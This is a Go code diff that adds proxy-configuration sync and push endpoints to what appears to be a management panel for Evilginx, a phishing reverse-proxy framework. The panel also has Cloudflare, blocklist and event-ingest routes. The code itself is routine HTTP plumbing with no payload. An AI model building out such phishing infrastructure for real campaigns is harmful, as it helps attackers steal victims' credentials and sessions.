@@ -877,6 +877,56 @@ func handleBlocklistPush(w http.ResponseWriter, r *http.Request) {
 	w.Write(respBody)
 }
 
+// handleProxySync handles GET requests to fetch Proxy config from Evilginx
+func handleProxySync(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	if !checkEvilginxAPI() {
+		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
+		return
+	}
+
+	cfg := fetchProxyConfig()
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"type":     cfg.Type,
+		"address":  cfg.Address,
+		"port":     cfg.Port,
+		"username": cfg.Username,
+		"enabled":  cfg.Enabled,
+	})
+}
+
+// handleProxyPush handles POST requests to push Proxy config to Evilginx
+func handleProxyPush(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	if !checkEvilginxAPI() {
+		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
+		return
+	}
+
+	var req ProxyConfig
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, "Invalid request body", http.StatusBadRequest)
+		return
+	}
+
+	if err := updateProxyConfig(&req); err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
+}
+
 // ProxyConfig represents the Proxy configuration from Evilginx
 type ProxyConfig struct {
 	Type     string `json:"type"`
@@ -2042,6 +2092,8 @@ func main() {
 	http.HandleFunc("/api/cloudflare/push", authMiddleware(handleCloudflarePush))
 	http.HandleFunc("/api/blocklist/sync", authMiddleware(handleBlocklistSync))
 	http.HandleFunc("/api/blocklist/push", authMiddleware(handleBlocklistPush))
+	http.HandleFunc("/api/proxy/sync", authMiddleware(handleProxySync))
+	http.HandleFunc("/api/proxy/push", authMiddleware(handleProxyPush))
 	http.HandleFunc("/api/internal/settings", handleInternalSettings)
 	http.HandleFunc("/api/internal/ingest", handleIngestEvent) // Event bridge from Evilginx
 	http.HandleFunc("/api/whitelist", authMiddleware(handleWhitelist))
